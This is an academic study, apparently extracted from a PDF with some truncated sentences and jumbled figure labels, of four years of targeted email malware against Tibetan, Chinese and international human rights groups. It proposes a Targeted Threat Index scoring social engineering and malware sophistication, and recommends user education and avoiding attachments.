For two of the three Tibetan groups in our study simple steps such as avoiding the use of email attachments could cut document - based malware threats delivered through e - mail that we observed by up to 95 % .
Civil society organizations ( CSOs ) , working on hu- man rights issues around the globe , face a spectrum of politically - motivated information security threats that seek to deny ( e.g .
Internet ﬁltering , denial - of - service at- tacks ) , manipulate ( e.g .
Targeted malware attacks in particular are an in- creasing problem for CSOs .
These attacks are not iso- lated incidents , but waves of attacks organized in cam- paigns that persistently attempt to compromise systems and gain access to networks over long periods of time while remaining undetected .
These campaigns are cus- tom designed for speciﬁc targets and are conducted by highly motivated attackers .
The objective of these cam- paigns is to extract information from compromised sys- tems and monitor user activity and is best understood as a form of espionage .
Targeted malware is an active re- search area , particularly in private industry .
However , focused studies on targeted attacks against CSOs are rel- atively limited despite the persistent threats they face and the vulnerability of these groups .
In this study , we work with 10 CSOs for a period of 4 years to characterize and track targeted malware cam- paigns against these groups .
With the exception of two groups that work on human rights in multiple countries , the remaining eight groups focus on China and Tibet- related human rights issues .
We focus on targeted mal- ware typically delivered via e - mail that is speciﬁcally tai- lored to these groups as opposed to conventional spam which has been well characterized in numerous previous works .
We consider the threats to these groups along two axes : the technical sophistica- tion of the malware as well as sophistication of the so- cial engineering used to deliver the malicious payload .
We combine these two metrics to form an overall threat ranking that we call the Targeted Threat Index ( TTI ) .
While other scoring systems exist for characterizing the level of severity and danger of a technical vulnerabil- ity , no common system exists for ranking the sophistication of targeted e - mail attacks .
A key to the success of our study is a unique method- ology , combining qualitative and technical analysis of e - mails and their attachments with ﬁeldwork ( e.g .
This method- ology , which we describe in more detail in Section 3 , al- lows us to both accurately rate the level of targeting of e- mail messages by interfacing with CSOs participating in our study ( Section 4.2 ) , and understand the relative tech- nical sophistication of different malware families used in the attacks ( Section 4.3 ) .
By combining the strengths of our qualitative and quantitative analysis , we are able to accurately understand trends in terms of social engineer- ing and technical sophistication of politically - motivated targeted malware threats faced by CSOs .
Our study makes the following observations , which have implications for security strategies that CSOs can employ to protect themselves from targeted malware : Attachments are the primary vector for email based targeted malware .
More than 80 % of malware deliv- ered to Tibet - related organizations in our study and sub- mitted to us is contained in an e - mail attachment .
Fur- ther , for 2 of the 3 Tibetan organizations in our study ( with at least 40 submitted e - mails ) , simply not opening attachments would mitigate more than 95 % of targeted malware threats that use email as a vector .
Targeted malware technical sophistication is low .
So- cial engineering sophistication is high We ﬁnd that the technical sophistication of targeted malware deliv- ered to CSOs in our study is relatively low ( e.g. , rela- tive to commercial malware that has been found targeting CSOs and journalists and conventional ﬁnan- cially motivated malware ) , with much more effort given to socially engineering messages to mislead users .
This ﬁnding highlights the potential for education efforts fo- cused on changing user behaviours rather than high - cost technical security solutions to help protect CSOs .
For numerous malware samples in our study we ob- serve several versions of the software appearing over the course of our four year study .
These multiple ver- sions show evidence of technical improvements to com- plement existing social engineering techniques .
Since the start of our study we have participated in a series of workshops with the participating Tibetan or- ganizations to translate these results into a training cur- riculum .
Speciﬁcally , we have educated them about how to identify suspicious e - mail headers to identify spoofed senders and demonstrated tools that can be used to check e - mailed links for malware and drive - by - downloads .
The rest of the paper is structured as follows .
Sec- tion 2 presents relevant background on targeted malware and attacks on CSOs .
Our data collection methodology is described in Section 3 .
We describe our targeting and technical sophistication metrics as well as how we com- bine them to produce the Targeted Threat Index ( TTI ) in Section 4 .
Training and outreach implications of our work are discussed in Section 5 .
We present related work in Section 6 and conclude in Section 7 .
Spam and mass phishing attacks are indiscriminate in the selection of targets and are directed to the largest number of users possible .
Similarly , ﬁnan- cially motivated malware such as banking trojans seek to compromise as many users as possible to maximize the potential proﬁts that can be made .
The social engi- neering tactics and themes used by these kinds of attacks are generic and the attack vectors are sent in high vol- umes .
By contrast targeted malware attacks are designed for speciﬁc targets , sent in lower volumes , and are moti- vated by the objective of stealing speciﬁc sensitive data from a target .
Targeted malware attacks typically involve the follow- ing stages : Reconnaissance : During this stage attackers conduct research on targets including proﬁling systems , software , and information security defenses used to identify possi- ble vulnerabilities and contextual information on person- nel and activities to aid social engineering .
Delivery : During this stage a vector for delivering the attack is selected .
Common vectors include e - mails with malicious documents or links , or contacting targets through instant messaging services and using social en- gineering to send malware to them .
Typically , a target of such an attack receives an e - mail , possibly appearing to be from someone they know , containing text that urges the user to open an attached document ( or visit a web- site ) .
Compromise : During this stage malicious code is exe- cuted on a target machine typically after a user initiated action such as opening a malicious document or link .
Command and Control : During this stage the infected host system establishes a communications channel to a command and control ( C & C ) server operated by the at- tackers .
Once this channel has been established the at- tackers can issue commands and download further mal- ware on to the system Additional attacker actions : After a successful com- promise is established , attackers can conduct a number of actions including ex - ﬁltrating data from the infected host and transmitting it back to attackers through a process of encrypting , compressing , and transferring to a server 2 operated by the attackers .
Attackers may also use pe- ripherals such as webcams and microphones to monitor users in real time .
The infected host may also serve as a starting point to infect other machines on the network and seek out speciﬁc information or credentials .
The United States government has been particularly vocal on the threat tar- geted malware enabled espionage poses .
General Keith Alexander , current Director of the National Security Agency and Commander of United States Cyber Com- mand has stated that the theft of US intellectual property through cyber espionage constitutes the `` greatest transfer of wealth in history '' .
Recent widely publicized tar- geted malware intrusions against Google , RSA , the New York Times and other high proﬁle targets have raised public awareness around these attacks Despite this increased attention , targeted malware is not a new problem , with over a decade of public reports on these kinds of attacks .
However , the majority of research on targeted malware is conducted by private security companies who typically focus on campaigns against industry and government entities .
As a result , tar- geted attacks on civil society and non - governmental or- ganizations have gone underreported despite the fact that these organizations have been shown to be frequently targeted by cyber espionage campaigns .
In particular , communities related to ethnic minority groups in China including Tibetans , Uyghurs , and religious groups such as Falun Gong have been frequent targets of cyber es- pionage campaigns with reports dating back to at least 2002 .
In some cases , the same actors have been revealed to be targeting civil society groups , government and indus- try entities .
A notable example of this was the 2009 re- port by the Citizen Lab , a research group at the Univer- sity of Toronto , which uncovered the `` GhostNet '' cyber espionage network .
The GhostNet case is not an isolated example , as other reports have shown CSOs ( commonly Tibetan organizations ) included as targets in campaigns that are also directed to a range of govern- ment and industry entities Some of these reports include technical details on the CSO spe- ciﬁc attacks while others note them as a target but do not address in detail .
While the majority of documented targeted malware campaigns against CSOs involve China and Tibet - related groups and potentially China - related attack operators , these kinds of at- tacks go beyond China .
Recent research and news media have reported attacks against large human rights groups focused on multiple issues and countries , and communities related to Syria and Iran .
Re- searchers have also uncovered the use of commercial network intrusion products used to target activists from Bahrain , the United Arab Emirates , and jour- nalists from Ethiopia .
Since our study involves dealing with e - mail messages which may contain personally identiﬁable information ( PII ) and collection of information from CSOs who need to maintain privacy of their data , we consulted with our institutional research ethics board during the design of our study .
The methods described below have been sub- mitted to and approved by this board .
As part of the study these groups agreed to share technical data ( e.g. , e - mails with suspicious attachments ) and participate in interviews at the onset and end of the study .
Their identity and any PII shared with us were kept strictly conﬁdential .
For the purposes of our study , we focused on organiza- tions with missions concerning the promotion or protec- tion of human rights .
For purposes of this study , `` human rights '' means any or all of the rights enumerated under the Universal Declaration of Human Rights , the In- ternational Covenant on Civil and Political Rights , and the International Covenant on Economic , Social and Cultural Rights .
We also considered organizations on a case by case basis that have a mission that does not directly implicate human rights , but who may nonethe- less be targeted by politically motivated digital attacks because of work related to human rights issues ( e.g. , me- dia organizations that report on human rights violations ) .
In total , 10 organizations participated in the study ( summarized in Table 1 ) .
The majority of these groups work on China - related rights issues and ﬁve of these or- ganizations focus speciﬁcally on Tibetan rights .
The high rate of participation from China and Tibet - related human rights issues is due in part to our previous relationships with these communities and a signiﬁcant interest and en- thusiasm expressed by the groups .
In addition to the China and Tibet - related groups , our study also includes 3 two groups , Rights Group 1 and 2 that work on multiple human rights related issues in various countries .
The majority of organizations operate from small of- ﬁces with less than 20 employees .
Some organizations ( China Group 2 , Tibet Group 2 ) have no physical ofﬁce and consist of small virtual teams collaborating remotely , often from home ofﬁces .
Of these groups only two ( China Group 1 , China Group 3 ) have a dedicated system administrator on staff .
Other groups ( Tibet Groups 1 - 5 ; China Group 2 ) rely on volunteers or staff with related technical skills ( e.g .
Web development ) to provide tech- nical support .
Rights Group 1 and Rights Group 2 are much larger organizations relative to the others in our sample .
Both organizations have over 100 employees , multiple ofﬁces , dedicated IT teams , and enterprise level computing infrastructures .
Our primary data source is a collection of e - mails identiﬁed by participants as suspicious which were forwarded to a dedicated e- mail server administered by our research team .
When available these submissions included full headers , ﬁle attachments and / or links .
There are three key limita- tions to relying on user - submitted e - mails for our anal- ysis .
First , we are only able to study e - mails identiﬁed by participants as suspicious , which may bias our re- sults to only reporting threats that have been ﬂagged by users .
Further , individuals may forget to forward e - mails in some cases .
Relying on self - reporting also creates bias between groups as individuals at different organizations may have different thresholds for reporting , which cre- ates difﬁculties in accurately comparing submission rates between groups .
Thus the amount of threat behaviour we see should be considered a lower bound on what oc- curs in practice .
Second , having participants forward us e - mails does not allow us to verify if the targeted organi- zation was successfully compromised by the attack ( e.g. , if another member of the organization open and executed malware on their machine ) and what the scope of the at- tack was .
Finally , e - mail is only one vector that may be used to target organizations .
Other vectors include water- hole attacks , denial of service attacks , or any other vectors ( e.g. , physical threats like infected USB sticks ) .
These limitations mean that it is possible that we did not comprehensively observe all attacks experienced by our study groups and some more advanced attacks may have gone unreported .
Recognizing the limitations of e - mail submissions , we complement user submitted emails with data from Net- Table 2 : Breakdown of e - mails submitted per group .
Also , upon request of study groups who were concerned of possible infection we analyzed packet capture data from suspect machines .
Through the course of this supplementary analysis we did not ﬁnd indications of malware compromise that used samples that were not included in our pool of user- submitted emails .
In this paper we focus on reporting results from analyzing the user submitted emails through the TTI .
The NIDS and website monitoring components were added later in our study and do not signiﬁcantly contribute to TTI analysis .
Data col- lection began on November 28 , 2011 , but China Group 3 and Tibet Group 1 forwarded us their pre - existing archives of suspicious emails , resulting in e - mail sam- ples dating back to October 14 , 2009 .
In total , we re- ceived 817 e - mails from the 10 groups participating in our study .
Table 2 breaks down the submissions from each groups and illustrates that submissions were highly non - uniform across the groups .
Thus , in general , we fo- cus on the groups with at least 50 e - mail submissions for our analysis .
Figure 1 shows the cumulative number of e - mail sub- missions per month over the course of the study .
For example , China Group 3 shared a set of e - mails received in 2010 by a highly targeted member of the organization , which can be observed in Figure 1 .
Tibet Group 1 ac- counts for the highest number of submissions relative to the other groups due to being one of the ﬁrst groups in the study and being persistently targeted by politically motivated malware .
Tibetan Groups 2 and 4 , who joined the study later ( in April 2012 ) show a similar submission rate to original Tibetan Group 1 , suggesting these groups are targeted at a similar rate .
In Section 4.2 , we investi- 4 Table 1 : Summary of groups participating in our study .
Figure 1 : Cumulative number of messages per group over the course of our study for groups that submitted at least 50 e - mail messages .
Figure 2 : Breakdown of malicious e - mails based on whether they deliver malware as an attachment , refer use to a link with a malicious ﬁle , or attempt to phish the data from the user .
We further classify e - mails as malicious if they include attached malware , a direct link to malware or a site with a drive - by download , or a link to a phishing page .
Fig- ure 2 shows the amount of e - mails of each type for the groups that submitted at least 25 e - mails to our system .
The most common approach employed in these e - mails was attaching a malicious payload to the e - mail itself .
However , we notice a higher rate of phishing attacks on the China - related groups and the rights groups working on multiple international human rights issues .
In partic- ular , 46 % of the e - mails submitted by China Group 1 , and 50 % of the e - mails submitted by Rights Group 1 , di- rect the user to a phishing Web site .
In the case of China Group 1 , this large proportion of phishing sites is ob- served because this group conﬁgured their spam ﬁlter to forward e - mails to our system , resulting in us receiving a large number of generic , non - targeted spam .
In con- trast , the phishing observed for Rights Group 1 , while low in volume ( 13 out of 26 messages ) is targeted .
We delve more into how we rate the targeting of e - mails in Section 4.2 .
The rate of submissions to our project meant that it was feasible to manually analyze e - mail attachments for malware as they were submitted .
This analysis gives us higher conﬁdence in our results because AV signatures are frequently unable to detect new or modiﬁed threats , and can overlook the presence of a malicious payload that can be easily identiﬁed upon manual inspection ( e.g .
In total , we analyzed 3,617 payload ﬁles and found 2,814 ( 78 % ) of them to be ma- licious .
Section 4.3 describes our analysis methodology in more detail .
Our dataset includes a wide range of targeted malware threats varying in level of both social engineering and technical complexity .
This range presents a challenge in ranking the relative sophistication of the malware and targeting tactics used by attackers .
While scoring systems such as the Common Vulnera- bility Scoring System exist for the purpose of com- municating the level of severity and danger of a vul- nerability , there is no standardized system for ranking 5 the sophistication of targeted email attacks .
This gap is likely because evaluating the sophistication of the target- ing is non - technical , and can not be automated due to the requirement of a strong familiarity with the underlying subject material .
To address this gap we developed the Targeted Threat Index ( TTI ) to assign a ranking score to the targeted ma- licious emails in our dataset .
The TTI score is intended for use in prioritizing the analysis of incoming threats , as well as for getting an overall idea of how severely an organization is threatened .
The TTI score is calculated by taking a base value de- termined by the sophistication of the targeting method , which is then multiplied by a value for the technical sophistication of the malware .
The base score can be used independently to compare emails , and the combined score gives an indication of the level of effort an attacker has put into individual threats .
Scores of 0 are reserved for threats that are not targeted , even if they are malicious .
For example , spam using an attached PDF or XLS to by- pass anti - spam ﬁlters , and highly sophisticated ﬁnan- cially motivated malware , would both score 0 .
This section overviews how we compute the Social Engineering Sophistication Base Value ( Section 4.2 ) and the Technical Sophistication Multiplier ( Section 4.3 ) .
In Section 4.4 , we present the results of computing and an- alyzing the TTI value of threats observed by the organi- zations in our study .
We also discuss implications and limitations of the metric .
While automated approaches may be explored in the future , this manual analysis allows us to have high conﬁdence in our results , especially since understanding the social engi- neering often required contextual information provided by the organizations in our study .
To quantify the level of sophistication , we manually analyse the e - mail subject line , body , attachments and header ﬁelds .
We perform an initial content analysis by coding the e - mails based on their semantic content , and then use these results to gen- erate a numerical metric quantifying the level of targeting used .
The content of the subject line , body and attachments for each submitted e - mail were content coded into 8 themes , each contain- ing categories for speciﬁc instances of the theme : Coun- try / Region ( referring to a speciﬁc geographical country or region ) ; Ethnic Groups ( referring to a speciﬁc ethnic group ) ; Event ( referring to a speciﬁc event ) ; Organiza- tions ( referring to speciﬁc organizations ) ; People ( refer- ring to speciﬁc persons ) , Political ( reference to speciﬁc political issues ) , Technology ( reference to technical sup- port ) , Miscellaneous ( content without clear context or categories that do not fall into one of the other themes ) .
Table 3 summarizes the themes and provides examples of categories within each theme .
E - mail headers .
The header of each e - mail was an- alyzed to determine if the sending e - mail address was spoofed or the e - mail address was otherwise designed to appear to come from a real person and / or organiza- tion ( e.g .
We divide the results based on whether they attempted to spoof an organization or a speciﬁc person .
Using this manual analysis , we perform a content anal- ysis of e - mails submitted by the organizations .
Results of this analysis conﬁrm that social engineering is an im- portant tool in the arsenal of adversaries who aim to de- liver targeted malware .
Speciﬁcally , 95 % and 97 % of e - mails to Chinese and Tibetan groups , respectively , in- cluded reference to relevant regional issues .
Spooﬁng of speciﬁc senders and organizations was also prevalent with 52 % of e - mails to Tibetan groups designed to ap- pear to come from real organizations , often from within the Tibetan community .
For example , a common tar- get of spooﬁng was the Central Tibetan Administration ( CTA ) , referenced in 21 % of the spoofed e - mails , which administers programs for Tibetan refugees living in In- dia and advocates for human rights in Tibet .
While the number of e - mail submissions were lower for the gen- eral human rights groups , we observe similar trends there with 92 % of e - mails submitted by Rights Group 1 ap- pearing to come from individuals in the group ( as a result of spooﬁng ) .
In some cases we even observed the same attackers targeting multiple CSOs with customized e - mail lures .
For example , we tracked a campaign that targeted China Groups 1 and 2 , and Tibet Group 1 with a remote access 6 Table 3 : Overview of themes and categories within the themes for grouping targeted e - mail messages .
In contrast , Tibet Group 1 re- ceived the malware embedded into a video of a speech by the Dalai Lama , attached to an e - mail about a year in review of Tibetan human rights issues .
We now describe how we assign the `` social engineering sophistication base value '' to e- mails based on their level of social engineering .
To measure the targeting sophistication we assign a score that ranges from 0 - 5 that rates the social engineer- ing techniques used to get the victim to open the attach- ment .
This score considers the content and presentation of the e - mail message as well as the claimed sender iden- tity .
This determination also includes the content of any associated ﬁles , as malware is often implanted into legit- imate relevant documents to evade suspicion from users when the malicious documents are opened .
The Social Engineering Sophistication Base Value is assigned based on the following criteria : 0 Not Targeted : Recipient does not appear to be a spe- ciﬁc target .
Content is not relevant to the recipient .
The e - mail is likely spam or a non - targeted phishing attempt .
Content is not relevant to the recipient or contains information that is obviously false with little to no valida- tion required by the recipient .
The e - mail header and/or signature do not reference a real person or organization .
Content is generally relevant to the target but has attributes that make it appear questionable ( e.g .
The e - mail header and / or signature may reference a real person or organization .
Content is relevant to the target and may repurpose legit- imate information ( such as a news article , press release , conference or event website ) and can be externally ver- iﬁed ( e.g .
Or , the e - mail text appears to re- purpose legitimate e - mail messages that may have been collected from public mailing lists or from compromised accounts .
The e - mail header and / or signature references a real person or organization .
The e - mail message is personalized for the recipient or target organization ( e.g .
Con- tent is relevant to the target and may repurpose legitimate information that can be externally veriﬁed or appears to repurpose legitimate messages .
The e - mail header and / or signature references a real person or organization .
The e - mail message is individually person- alized and customized for the recipient and references conﬁdential / sensitive information that is directly rele- vant to the target ( e.g .
The e - mail header and / or signature references a real person or organization .
Content coding of emails and determinations of so- cial engineering ratings for the TTI were performed by ﬁve independent coders who were given a code book for content categories and the TTI social engineering scale with examples to guide analysis .
We performed regu- lar inter - rater reliability checks and ﬂagged any poten- tial edge cases and inconsistencies for discussion and re- evaluation .
Following completion of this analysis , two of the authors reviewed the social engineering base value scores to ensure consistency and conformity to the scale .
We provide speciﬁc examples of each of these targeting values in Appendix A .
We can see that actors targeting these groups put signiﬁcant effort into targeting their messages , in particular the three Ti- betan groups included in Figure 3 observe more than half of their messages with a targeting score of 3 or higher .
This result means adversaries are taking care to make the e - mail appear to come from a legitimate individual or or- ganization , and include relevant information ( e.g. , news reports or exchanges from public mailing lists ) .
Higher targeting scores , which result from actions such as per- sonalizing lures to an individual in the group , or includ- ing information that requires prior reconnaissance tend to be more rare , but we do observe instances of them .
For example , in the case of China Group 3 , we observed an e - mail which received a social engineering score of 5 , which claimed to be from the group 's funder and refer- enced a speciﬁc meeting they had planned that was not public knowledge .
The malware is then analyzed in de- tail to extract information such as the vulnerability , C & C server ( if present ) , and technical sophistication of the ex- ploit .
This process involves an initial inspection for social engineering of the email message and attachment ( e.g. , an executable pretending to be a document ) .
We also correlate with other emails received as part of this project to identify already - known malware .
Well - known malware attacks ( e.g. , the Zeus trojan masquerading as an email from the ACH credit card payment processor , or Bredolab malware pretending to be from the DHL courier service ) are not considered targeted attacks in our study , but are still kept for potential review .
Once we have identiﬁed emails which we suspect of containing politically - motivated malware , we perform the following analysis steps on any attachments to ver- ify that they indeed contain malware .
First , we run the attachment in a sandboxed VM to look for malicious ac- tivity e.g. , an Ofﬁce document writing ﬁles to disk or try- ing to connect to a C & C server .
We also check the MD5 hash of the attachment against the Virus Total dto see if it matches existing viruses .
We also manually ex- amine the attached ﬁle for signs of malicious intent ( e.g. , executable payload in a PDF , shellcode or Javascript ) .
We exclude any graphics attached to the email which are used for social engineering ( and do not contain malicious payload ) from our analysis .
We follow this initial analysis with more dtech- nical analysis of the attachments which we conﬁrm con- tain malware .
First , we manually verify the ﬁle type of the attachment for overview statistics .
This manual anal- ysis is necessary as the Unix ﬁle command may be mis- led by methods of manipulating important bytes in the ﬁle ( e.g. , replacing \rtf1 with \rtf [ null ] ) .
We t- tify if the vulnerability included in the malware already exists in a corpus of vulnerabilities , such as the Com- mon Vulnerabilities and Exposures ( CVE ) naming sys- tem .
We also perform analysis of network trafﬁc from the attachment to identify the C & C server the malware attempts to contact .
In cases where the malware does not execute in our controlled environment we manually examine the ﬁle to extract the relevant information .
On a case - by - case basis we use additional tools such as IDA and OllyDbg for detailed static and dy- namic analysis , respectively .
Our goal in this analysis is to identify relationships between malware campaigns between organizations , or instances of the same malware family repeatedly targeting a given organization .
By ob- serving overlapping C & C servers , or mapping malware to common exploits identiﬁed by anti virus / security com- panies we can cluster attacks that we believe come from the same malware family and potentially the same adver- sary .
Each malware sample is assigned one of the following values : 1 Not Protected - The sample contains no code protec- 8 tion such as packing , obfuscation ( e.g .
This level includes malware where code that contains the core functionality of the program is decrypted only in memory .
The purpose of the technical sophistication multiplier is to measure how well the payload of the malware can conceal its presence on a compromised machine .
We use a multiplier because advanced malware requires signif- icantly more time and effort ( or money , in the case of commercial solutions ) to customize for a particular tar- get .
We focus on the level of obfuscation used to hide pro- gram functionality and avoid detection for the follow- ing reasons : ( 1 ) It allows the compromised system to remain infected for a longer period ; ( 2 ) it hinders ana- lysts from dissecting a sample and developing instruc- tions to detect the malware and disinfect a compromised system ; ( 3 ) since most common used remote access tro- jans ( RATs ) have the same core functionality ( e.g .
One key observation we make here is that the email - based targeted malware that was self- Figure 4 : Technical sophistication multiplier assigned to e - mail submissions from groups that submitted at least 50 e - mails .
The highest multiplier value we see is 1.5 and even that value is seen infrequently .
The majority of malware observed is rated either 1 or 1.25 according to our technical scoring criteria , with Tibetan Groups observing a higher fraction of malware rated 1.25 and Chinese groups observing a higher fraction rated 1 .
The technical sophistication multiplier value is also useful for assessing the technical evolution of threats in our study .
When we group malware into different fam- ily groups we can see some of these groups are under active development .
For example , we observe multiple versions of the Enfal , Mongal , and Gh0st RAT families with increasing levels of sophistica- tion and defenses in place to protect the malware code ( resulting in an increase in technical multiplier from 1 to 1.25 for these families ) .
Since our technical multiplier value focuses on how well malware code defends and disguises itself , changes to other aspects of the code may not result in an increase in value ( e.g. , we observe multi- ple versions of the IMuler . A / Revir . A malware which all receive a score of 1 ) .
Interestingly , when we observe both a Windows and Mac version of a given malware family , the technical score for the Mac version tended to be lower with the Mac version being relatively primitive relative to the Windows variant .
Figure 5 shows the technical sophistication multiplier and maximum / minimum TTI scores for malware fami- lies observed in our dataset .
Since we primarily observe simple malware , with a technical sophistication multi- plier of 1 or 1.25 , this value does a poor job of differen- tiating the threat posed by the different malware families to the CSOs .
However , by incorporating both the tech- nical sophistication and targeting base value into the TTI metric we can gain more insights into how effective these 9 7 TTI / Technical Sophistication Score 6 Table 4 : Top malware families in our data set in terms of 5 4 technical sophistication multiplier and in terms of ﬁnal 3 TTI score .
Soph .
Soph .
Figure 5 : Comparison of the maximum and minimum Gh0stRAT LURK0 6.25 1.25 TTI score and technical sophistication multiplied for shadownet 6.25 1.25 malware families observed in our data ( sorted in decreas- conime 5 1.25 ing order of maximum TTI ) .
The impact of using TTI is especially apparent when trying to gain insights into the targeted malware that poses the biggest risk to CSOs .
Table 4 shows the top 5 malware families we observe in terms of technical so- phistication and in terms of TTI score .
If we consider the malware families with the highest technical sophistica- tion , we can see that their TTI values are relatively low , with maximums ranging from 1.5 to 4.5 .
These tend to be malware families that are familiar to researchers .
In par- ticular , PlugX and PoisonIvy have been used in targeted attacks together and PlugX is still actively used and under constant development .
Despite technical so- phistication , the social engineering lures of these threats are not well crafted and pose less of a risk to the CSOs whose members may be able to identify and avoid these threats .
In contrast , the top 5 malware families in terms of TTI have lower technical sophistication ( 1.25 ) but much higher levels of social engineering .
It is no surprise that threats which score the highest TTI use well known mal- ware that have been extensively documented in attacks against a variety of targets .
For example , the TTI scores reﬂect that Gh0st RAT continues to be seen in higher risk attacks due to its popularity amongst attackers even though it is an older and not particularly advanced tool .
Since there is no direct connection between the technical sophistication of threats and the level of social engineer- ing used to target CSOs , it is likely that different threat actors , with a different focus , are at work here .
Indeed , Gh0st RAT was discovered by the Citizen Lab in their analysis of GhostNet and IEXPL0RE RAT was dis- covered and named for the ﬁrst time in our work .
Another observation is that commercial malware such as FinFisher and DaVinci RCS , while being of much higher technical sophistication ( relative to the samples in our study ) , do not necessarily score higher on TTI than a targeted attack with advanced social engineering and more basic malware .
For example , analyzing a FinFisher sample targeted against Bahraini activists with the TTI , produces an overall TTI score that is dependent on the social targeting aspect , even though the malware is very technically advanced .
In this case , the FinFisher at- tack scores 4.0 on the TTI ( base targeting score of 2 with a technical multiplier of 2 ) .
Although the email used in the attack references the name and organization of a real journalist , the content is poorly customized , and has attributes that look questionable .
However , the techni- cal sophistication of the malware is advanced earning it a score of 2 due to multiple advanced protection tech- niques , including a custom - written virtualized packer , MBR modiﬁcation , and rootkit functionality .
The sample also uses multiple minor forms of protection , including at least half a dozen anti - debugging tricks .
Even though the technical multiplier is the maximum value , the over- all TTI score is only 4.0 due to the low targeting base value .
If the malware is deliv- ered through an email attachment , infection is only suc- cessful if the user opens the malicious ﬁle .
The advanced nature of this malware will cause the overall score to in- crease quickly with improved targeting , but as it still re- quires user intervention , this threat scores lower overall than attacks with highly targeted social engineering us- ing less sophisticated malware .
Similar ﬁndings can also be observed in attacks using DaVinci RCS developed by Italy - based company Hack- ing Team against activists and independent media groups from the United Arab Emirates and Morocco .
While the malware used in these publicly reported attacks is 10 technically sophisticated , the social engineering lures employed are poorly customized for the targets result- ing in a 4.0 TTI score ( targeting base value 2 , technical multiplier 2 ) .
These results support the idea that different threat ac- tors have varying focuses and levels of resources , and as a result , different methodologies for attacks .
For ex- ample , the majority of malware submitted by our study groups appear to be from adversaries that have in - house malware development capabilities and the capacity to organize and implement targeted malware campaigns .
These adversaries are spending signiﬁcant effort on so- cial engineering , but generally do not use technically advanced malware .
Conversely , the adversaries using FinFisher and DaVinci RCS have bought these products rather than develop malware themselves .
However , while the FinFisher and RCS samples are technically sophisti- cated pieces of malware , the attacks we analyzed are not sophisticated in terms of social engineering tactics .
Average TTI scores in our dataset may be skewed due to the self - reporting method we use in the study .
Very good threats are less likely to be noticed and reported while being sent to far fewer people , and low- quality emails are much more likely to be sent in bulk and stand out .
It is also possible that individuals in differ- ent groups may be more diligent in submitting samples , which could affect between group comparisons .
We are more interested , however , in worst - case ( highest ) scores and not in comparing the average threat severity between organizations .
Finally , this metric is calculated based on the technical sophistication of the payload , not on the speciﬁc exploit .
There is currently no method to modify the TTI score in a way similar to the temporal metrics used by the CVSS metric .
A temporal metric could be added to increase the ﬁnal TTI value for 0-day vulnerabilities , or possibly to reduce the score for exploits that are easily detectable due to a public and well - known generation script , e.g .
Metasploit Our study primarily focuses on threats that groups work- ing on human rights issues related to Tibet or China are currently facing .
While our dataset is concentrated on these types of groups , our results have implications for how CSOs can protect themselves against email - based targeted malware .
Speciﬁcally , we ﬁnd that moving towards cloud - based platforms ( e.g. , Google Docs ) instead of relying on e- mail attachments would prevent more than 95 % of the e - mail malware seen by 2 out of 3 Tibetan groups that had more than 50 e - mail submissions .
Further , our results highlight the potential for lower- cost user education initiatives to guard against sophis- ticated social engineering attacks , rather than high cost technical solutions .
This observation stems from the fact that much of the malware we observe is not technically sophisticated , but rather relies on social engineering to deliver its payload by convincing users to open malicious attachments or links .
Other studies that have revealed the use of commercial malware products against CSOs and journalists have shown that many of these cases also rely on duping users into opening malicious e - mail attachments or social engineered instant messag- ing conversations .
These incidents show that even ad- vanced targeted malware requires successful exploitation of users through social engineering tactics .
User education can be a powerful tool against the kinds of targeted attacks we observed in this study .
In- deed , the Tibetan community has taken an active ap- proach with campaigns that urge Tibetan users to not send or open attachments and suggests alternative cloud based options such as Google Docs and Dropbox for sharing documents .
We have also engaged the Ti- betan groups in a series of workshops to introduce train- ing curriculum which draws on examples submitted by organizations participating in our study .
We have also provided them with technical background to identify sus- picious e - mail headers and how to use free services to check the validity of suspicious links in e - mail messages .
The mitigation strategies presented here are focused on email vectors and do not consider all of the possible attacks these groups may face .
We highlight these strate- gies in particular because the majority of groups in our study identiﬁed document - based targeted malware as a high priority information security concern .
The adver- saries behind these attacks are highly motivated and will likely adapt their tactics as users change their behaviors .
For example , it is plausible that if every user in a partic- ular community began to avoid opening attachments and document - based malware infected fewer targets , attack- ers may move on to vectors such as waterhole attacks or attacks on cloud document platforms to ﬁll the gap .
User education and awareness raising activities need to be on- going efforts that are informed by current research on the state of threats particular communities are experiencing .
Evaluation of the effectiveness of user education efforts in at risk communities and corresponding reactions from attackers is required to understand the dynamics between 11 these processes .
There is a wide body of literature on ﬁltering and detec- tion methods for spam and phishing emails and websites .
Attention has also been given to evaluating user behavior around phishing attacks and techniques for evading them .
By comparison research on detecting email vectors used for targeted malware attacks is limited .
A notable excep- tion is , which uses threat and recipient features with a random forest classiﬁer to detect targeted mali- cious emails in a dataset from a large Fortune 500 com- pany .
Other work has focused on imporoving detection of documents ( e.g .
Guira and Wang propose a conceptual attack model called the attack pyramid to model targeted attacks and identify features that can be detected at the various stages .
Hutchins , Cloppert and Amin , use a kill chain model to track targeted at- tack campaigns and inform defensive strategies .
Metrics have been developed to characterize security vulnerabilities and their severity .
The indus- try standard is the Common Vulnerability Scoring Sys- tem ( CVSS ) , which uses three metric groups for characterizing vulnerabilities and their impacts .
These groups are : base metric group ( the intrinsic and fun- damental characteristics of a vulnerability that are con- stant over time and user environments ) , temporal metric group ( characteristics of a vulnerability that change over time but not among user environments ) and environmen- tal metric group ( characteristics of a vulnerability that are relevant and unique to a particular user 's environ- ment ) .
The CVSS is a widely adopted metric , but only rates technical vulnerabilities .
Targeted attacks rely on a user action of opening a malicious attachment or visiting a malicious link to successfully compromise a system .
Therefore , the sophistication of message lures and other social engineering tactics are an important part of deter- mining the severity of a targeted attack .
Systems like the CVSS can not address this contextual component .
Our study makes the following contributions to the literature .
Previous studies of targeted attacks against CSOs usually focus on particular incidents or campaigns and do not include longitudinal observations of attacks against a range of CSO targets .
While standards exist for rating the sophistication of technical vulnerabilities and research has been done on detecting targeted mal- ware attacks and modeling campaigns , there is no scor- ing system that considers both the sophistication of mal- ware and social engineering tactics used in targeted mal- ware attacks .
We address this gap through development of the TTI and validate the metric against four years of data collected from 10 CSOs .
Our study provides an in - depth look at targeted malware threats faced by CSOs .
We ﬁnd that considering the technical sophistication of these threats alone is insuf- ﬁcient and that educating users about social engineer- ing tactics used by adversaries can be a powerful tool for improving the security of these organizations .
Our results point to simple steps groups can take to protect themselves from document - based targeted malware such as shifting to cloud - based document platforms instead of relying on attachments which can contain exploits .
Further research is needed to measure the effectiveness of education strategies for changing user behaviour and how effective these efforts are in mitigation of document- based malware for CSOs .
Further work is also required in monitoring how attackers adapt tactics in response to observed behavioural changes in targeted communities .
